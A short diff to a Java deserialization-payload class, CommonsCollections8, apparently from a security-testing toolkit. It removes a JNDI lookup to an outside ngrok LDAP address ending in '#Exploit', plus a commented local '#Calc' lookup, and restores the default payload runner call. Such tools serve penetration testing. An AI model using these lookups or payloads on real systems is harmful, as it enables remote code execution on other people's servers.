@@ -50,9 +50,7 @@ public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<
     }
 
     public static void main(final String[] args) throws Exception {
-        new javax.naming.InitialContext().lookup("ldap://0.tcp.ngrok.io:11391/#Exploit");
-//        new InitialContext().lookup("ldap://127.0.0.1:44321/#Calc");
-//        PayloadRunner.run(CommonsCollections8.class, args);
+        PayloadRunner.run(CommonsCollections8.class, args);
     }
 
 }
